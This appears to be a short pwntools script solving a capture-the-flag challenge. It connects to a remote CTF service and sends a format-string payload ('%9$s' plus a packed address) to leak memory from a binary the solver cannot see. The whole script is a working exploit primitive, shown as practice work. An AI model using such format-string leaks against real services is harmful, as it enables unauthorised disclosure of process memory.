from pwn import *

context.log_level = "debug"

io = remote("nc1.ctfplus.cn", 18735)

io.recvuntil(b"You don't have the ELF, but you have a magic echo...\n")

io.sendline(b"%9$sAAAA" + p64(0x400000))

io.recv()